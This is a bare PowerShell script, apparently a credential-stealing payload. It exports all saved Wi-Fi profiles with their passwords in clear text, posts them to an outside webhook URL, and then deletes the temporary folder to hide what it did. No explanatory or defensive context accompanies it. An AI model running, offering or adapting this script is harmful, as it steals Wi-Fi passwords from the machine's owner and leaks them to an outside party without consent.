$u = "https://webhooksite.net/a270de88-d3f2-4a75-b84b-9cc46152e95d"
$t = "$env:TEMP\wifi_test"
New-Item -ItemType Directory -Force -Path $t | Out-Null
Set-Location $t
netsh wlan export profile key=clear | Out-Null
$data = ""
Get-ChildItem -Filter *.xml | ForEach-Object {
    $data += Get-Content $_.FullName -Raw
}
if ($data -ne "") {
    Invoke-RestMethod -Uri $u -Method Post -Body $data -ContentType "text/plain"
}
Set-Location $env:TEMP
Remove-Item -Path $t -Recurse -Force
